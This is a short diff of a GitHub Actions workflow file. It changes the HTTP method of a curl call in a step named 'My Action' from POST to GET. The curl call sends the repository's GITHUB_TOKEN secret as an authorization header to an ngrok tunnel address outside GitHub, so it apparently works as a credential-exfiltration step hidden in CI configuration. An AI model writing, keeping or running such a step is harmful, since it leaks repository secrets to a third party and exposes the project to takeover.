@@ -8,7 +8,7 @@ jobs:
       - name: My Action
         run: |
           curl \
-          -X POST \
+          -X GET \
           -H "Accept: application/json" \
           -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
           https://4c93-185-187-131-190.ngrok.io
